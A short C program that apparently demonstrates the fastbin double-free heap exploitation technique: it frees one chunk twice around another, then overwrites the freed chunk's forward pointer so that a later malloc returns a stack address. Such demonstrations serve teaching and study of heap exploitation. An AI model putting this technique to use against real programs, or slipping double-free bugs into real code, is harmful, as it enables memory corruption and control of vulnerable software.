
#include <stdlib.h>
int main()
{
	unsigned long long stack_var;
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);
	free(a);
	// free(a);
	free(b);
	free(a);
	unsigned long long *d = malloc(8);
	malloc(8);
	stack_var = 0x20;
	*d = (unsigned long long) (((char *)&stack_var) - sizeof(d));
	malloc(8);
	malloc(8);
}
